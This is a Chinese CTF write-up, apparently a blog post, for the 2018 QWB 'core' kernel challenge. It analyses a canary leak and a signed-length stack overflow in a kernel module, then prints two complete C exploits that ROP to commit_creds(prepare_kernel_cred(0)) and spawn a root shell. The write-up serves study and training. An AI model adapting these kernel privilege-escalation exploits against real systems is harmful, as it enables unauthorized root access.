---
layout: post
title: 2018 kernel pwn core
excerpt: "kernel pwn"
categories: [未完待续]
comments: true
---
https://xz.aliyun.com/t/5822#toc-0

查看下保护
```c
root@snappyjack-VirtualBox:/home/2018rop# checksec core.ko
[*] '/home/2018rop/core.ko'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x0)
```
发现开启了Canary

查看core_copy_func函数
```
signed __int64 __fastcall core_copy_func(signed __int64 a1, __int64 a2)
{
  signed __int64 result; // rax@2
  __int64 v3; // rdx@4
  __int64 v4; // [sp+0h] [bp-50h]@2
  __int64 v5; // [sp+40h] [bp-10h]@1

  v5 = *MK_FP(__GS__, 40LL);
  printk(&unk_215, a2);
  if ( a1 > 63 )
  {
    printk(&unk_2A1, a2);
    result = 0xFFFFFFFFLL;
  }
  else
  {
    result = 0LL;
    qmemcpy(&v4, &name, (unsigned __int16)a1);
  }
  v3 = *MK_FP(__GS__, 40LL) ^ v5;
  return result;
}
```
发现a1的类型发生了转变,当我们输入如0xf000000000000000|0x100这样的数据就可以绕过限制,就可以造成内核的栈溢出了

再看core_read函数
```c
int __fastcall core_read(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx@1
  __int64 *v3; // rdi@1
  signed __int64 i; // rcx@1
  __int64 v5; // rax@4
  __int64 v7; // [sp+0h] [bp-50h]@1
  __int64 v8; // [sp+40h] [bp-10h]@1

  v2 = a1;
  v8 = *MK_FP(__GS__, 40LL);
  printk(&unk_25B, a2);
  printk(&unk_275, off);
  v3 = &v7;
  for ( i = 16LL; i; --i )
  {
    *(_DWORD *)v3 = 0;
    v3 = (__int64 *)((char *)v3 + 4);
  }
  strcpy((char *)&v7, "Welcome to the QWB CTF challenge.\n");
  LODWORD(v5) = copy_to_user(v2, (char *)&v7 + off, 64LL);// 这里存在一个泄露
  if ( v5 )
    __asm { swapgs }
  else
    v5 = *MK_FP(__GS__, 40LL) ^ v8;
  return v5;
}
```
可以泄露出Canary

#### 利用思路
- 设置全局变量off的大小，然后通过core_read()leak出canary
- 通过core_write()向全局变量name中写入我们构造的ROPchain
- 通过设置合理的长度利用core_copy_func()函数把name的ROPchain向v2变量上写,进行ROP攻击
- ROP调用commit_creds(prepare_kernel_cred(0))，然后swapgs，iretq到用户态;
- 用户态起shell，get root;

### 利用
提权函数
```
commit_creds(prepare_kernel_cred(0));
```
在虚拟机中查看地址
```
                       / # cat /proc/kallsyms | grep commit_creds
                       faa89c8e0 T commit_creds
                       / # cat /proc/kallsyms | grep prepare_kernel_cred
                       faa89cce0 T prepare_kernel_cred
```
最终exp
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>

unsigned long user_cs, user_ss, user_eflags,user_sp	;
void save_stats() {
	asm(
		"movq %%cs, %0\n"
		"movq %%ss, %1\n"
		"movq %%rsp, %3\n"
		"pushfq\n"
		"popq %2\n"
		:"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
 		:
 		: "memory"
 	);
}

void get_shell(void){
    system("/bin/sh");
}
//eip =(unsigned long long) get_shell;

#define KERNCALL __attribute__((regparm(3)))
void* (*prepare_kernel_cred)(void*) KERNCALL ;
void (*commit_creds)(void*) KERNCALL ;
void payload(){
      commit_creds(prepare_kernel_cred(0));
}

void setoff(int fd,int off){
	ioctl(fd,0x6677889C,off);
}

void core_read(int fd,char *buf){
	ioctl(fd,0x6677889B,buf);
}

void core_copy(int fd , unsigned long long len){
	ioctl(fd, 0x6677889A,len);
}

int main(void){
	save_stats() ; 
	unsigned long long buf[0x40/8];
	memset(buf,0,0x40);
	unsigned long long canary ;
	unsigned long long module_base ;
	unsigned long long vmlinux_base ; 
	unsigned long long iretq ;
	unsigned long long swapgs ;
	unsigned long long rop[0x30];
	memset(buf,0,0x30*8);
	int fd = open("/proc/core",O_RDWR);
	if(fd == -1){
		printf("open file error\n");
		exit(0);
	}
	else{
		printf("open file success\n");
	}
	printf("[*] buf: 0x%p",buf);
	setoff(fd,0x40);
	core_read(fd,buf);
	canary = buf[0];
	module_base =  buf[2] - 0x19b;
	vmlinux_base = buf[4] - 0x16684f0;
	printf("[*] canary: 0x%p",canary);
	printf("[*] module_base: 0x%p",module_base);
	printf("[*] vmlinux_base: 0x%p",vmlinux_base);
	commit_creds = vmlinux_base + 0x9c8e0;
	prepare_kernel_cred = vmlinux_base + 0x9cce0;
	iretq = vmlinux_base + 0x50ac2;
	swapgs  = module_base + 0x0d6;
	rop[8] = canary ; 
	rop[10] = payload;
	rop[11] = swapgs;
	rop[12] = 0;
	rop[13] = iretq ;
	rop[14] = get_shell ; 
	rop[15] = user_cs;
	rop[16] = user_eflags;
	rop[17] = user_sp;
	rop[18] = user_ss;
	rop[19] = 0;
	write(fd,rop,0x30*8);
	core_copy(fd,0xf000000000000000+0x30*8);
}

```
或者
```
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <pthread.h>
void setoff(int fd,long long size){
	ioctl(fd,0x6677889C,size);
}
void core_read(int fd,char *buf){
	ioctl(fd,0x6677889b,buf);
}
void core_copy_func(int fd,long long size){
	ioctl(fd,0x6677889a,size);
}
unsigned long user_cs, user_ss, user_eflags,user_sp	;
void save_stats() {
	asm(
		"movq %%cs, %0\n"
		"movq %%ss, %1\n"
		"movq %%rsp, %3\n"
		"pushfq\n"
		"popq %2\n"
		:"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
 		:
 		: "memory"
 	);
}

void get_shell(){
	system("/bin/sh");
}

int main(){
	int fd ;
	size_t tmp ;
	char buf[0x50];
	size_t shellcode[0x100];
	size_t vmlinux_base,canary,module_core_base;
	size_t commit_creds =  0x9c8e0;
	size_t prepare_kernel_cred = 0x9cce0;
	save_stats();
	fd = open("/proc/core",O_RDWR);
	if(fd < 0 ){
		printf("Open /proc/core error!\n");
		exit(0);
	}
	setoff(fd,0x40);
	core_read(fd,buf);
	/*	for test
	for(int i = 0;i<8;i++){
		tmp = *(size_t *)(&buf[i*8]);
		printf("[%d] %p\n",i,tmp);
	}
	*/
	size_t pop_rdi = 0x000b2f;
	size_t push_rax =  0x02d112;
	size_t swapgs = 0x0d6;
	size_t iret ;
	size_t xchg = 0x16684f0;
	size_t call_rax=0x40398;
	size_t pop_rcx = 0x21e53;
	size_t pop_rbp = 0x3c4; //: pop rbp ; ret
	size_t pop_rdx = 0xa0f49 ;//: pop rdx ; ret
	size_t mov_rdi_rax_call_rdx = 0x01aa6a;
	vmlinux_base = (*(size_t *)(&buf[4*8])-0x1dd6d1 );
	printf("[+] vmlinux_base:%p\n",vmlinux_base);
	canary = (*(size_t *)(&buf[0]));
	printf("[+] canary:%p\n",canary);
	module_core_base = (*(size_t *)(&buf[2*8])-0x19b );
	printf("[+] module_core_base:%p\n",module_core_base);
	commit_creds+=vmlinux_base;
	prepare_kernel_cred += vmlinux_base;
	pop_rdi += vmlinux_base;
	push_rax += vmlinux_base;
	swapgs += module_core_base ;
	iret = 0x50ac2+vmlinux_base;
	xchg += vmlinux_base;
	call_rax += vmlinux_base;
	pop_rcx += vmlinux_base;
	mov_rdi_rax_call_rdx +=vmlinux_base;
	pop_rdx += vmlinux_base;
	printf("[+] commit_creds:%p\n",commit_creds);
	printf("[+] prepare_kernel_cred:%p\n",prepare_kernel_cred);
	//shellcode[0]=shellcode[0]
	//shellcode[] =
	for(int i=0;i<9;i++){
		shellcode[i]=canary;
	} 
	shellcode[9] = (*(size_t *)(&buf[1]) );
	shellcode[10] = pop_rdi;	//0xdeadbeefdeadbeef;
	shellcode[11] = 0;
	shellcode[12] = prepare_kernel_cred;

	shellcode[13] = pop_rdx;
	shellcode[14] = pop_rcx;
	shellcode[15] = mov_rdi_rax_call_rdx;
	shellcode[16] = commit_creds;
	shellcode[17] = swapgs;
	shellcode[18] = shellcode;
	shellcode[19] = iret;
	shellcode[20] = (size_t)get_shell;
	shellcode[21] = user_cs;
	shellcode[22] = user_eflags;
	shellcode[23] = user_sp;
	shellcode[24] = user_ss;
	
	write(fd,shellcode,25*8);
	core_copy_func(fd,0xf000000000000000+25*8);

}
```